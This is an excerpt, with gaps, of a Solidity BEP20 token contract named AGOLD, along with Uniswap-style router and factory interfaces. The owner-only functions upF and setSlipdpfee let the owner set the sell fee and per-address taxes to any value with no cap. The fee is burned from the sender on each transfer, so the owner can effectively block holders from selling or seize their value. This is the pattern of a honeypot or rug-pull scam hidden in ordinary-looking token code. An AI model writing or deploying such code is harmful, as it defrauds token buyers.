...
interface IUniswapV2Factory {
    ...
    function dpfeeTo() external view returns (address);
    function dpfeeToSetter() external view returns (address);
    ...
    function setdpfeeTo(address) external;
    function setdpfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingdpfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingdpfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingdpfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingdpfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingdpfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract AGOLD is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSelldpfee = 0;

    uint256 private _defaultBuydpfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipdpfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSelldpfee = _value;
    }

    function setSlipdpfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipdpfee[_address] = _value;
    }

    function getSlipdpfee(address _address) external view onlyownar returns (uint256) {
        return _slipdpfee[_address];
    }


    function setMAccountdpfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountdpfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradedpfeeAmount = 0;

        if (rF) {
            uint256 tradedpfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradedpfee = _defaultSelldpfee;
                }
                if (from == uniswapV2Pair) {

                    tradedpfee = _defaultBuydpfee;
                }
            }
            if (_slipdpfee[from] > 0) {
                tradedpfee = _slipdpfee[from];
            }

            tradedpfeeAmount = _Amount.mul(tradedpfee).div(100);
        }


        if (tradedpfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradedpfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradedpfeeAmount);
            emit Transfer(from, _deadAddress, tradedpfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradedpfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradedpfeeAmount);
        emit Transfer(from, _to, _Amount - tradedpfeeAmount);
    }
